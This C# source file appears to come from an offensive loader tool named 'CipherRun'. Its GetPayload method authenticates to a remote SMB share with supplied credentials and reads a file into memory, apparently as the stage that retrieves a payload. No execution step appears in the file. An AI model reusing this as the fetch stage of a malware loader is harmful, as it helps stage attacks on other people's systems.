/* my personal favorite ;) */

using System;
using System.IO;
using static CipherRun.Data.Structs;
using static CipherRun.Helpers.Methods;

namespace CipherRun.Retrievers
{
    /// <summary>
    /// This Class Contains a Function to Retrieve Files Over Smb UNC Paths
    /// </summary>
    public class Smb
    {
        /// <summary>
        /// This Function Retrieves a File over SMB UNC path by authenticating to the Share and Reading the File without Mapping the Share to a Device
        /// </summary>
        /// <param name="username"></param>
        /// <param name="password"></param>
        /// <param name="filename"></param>
        /// <param name="sharename"></param>
        /// <returns>byte array containg the data</returns>
        public static byte[] GetPayload(string username, string password , string filename, string sharename) {

            const int RESOURCETYPE_DISK = 0x00000001;
            byte[] data = new byte[] { };

            NETRESOURCE nr = new NETRESOURCE /* initializing NETRESOURCE struct with the needed values*/
            {
                dwType = RESOURCETYPE_DISK,
                lpRemoteName = sharename
            };

            int result = WNetUseConnectionA(IntPtr.Zero, nr, password, username, 0, null, null, null);

            if (result == 0)
            { /* Connection Success, Read the file*/
                data = File.ReadAllBytes(filename);
            }
            else { Console.WriteLine($"[-] Connection Failed with error code: {result}, use (net helpmsg ERROR_CODE_HERE) to find out why"); }

            return data;

        }
    }
}
